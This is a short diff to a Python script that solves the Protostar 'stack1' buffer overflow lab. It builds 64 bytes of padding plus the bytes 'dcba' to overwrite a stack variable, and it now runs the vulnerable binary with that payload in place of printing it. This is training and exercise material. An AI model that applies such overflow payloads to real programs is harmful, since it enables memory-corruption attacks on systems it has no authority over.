@@ -4,4 +4,7 @@ buff = "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVVWWWXX
 
 value = '\x64\x63\x62\x61'
 
-print buff[:64] + "%s" % value
+payload = buff[:64] + "%s" % value
+
+from utils import run_file_with_args
+run_file_with_args("/opt/protostar/bin/stack1", payload)
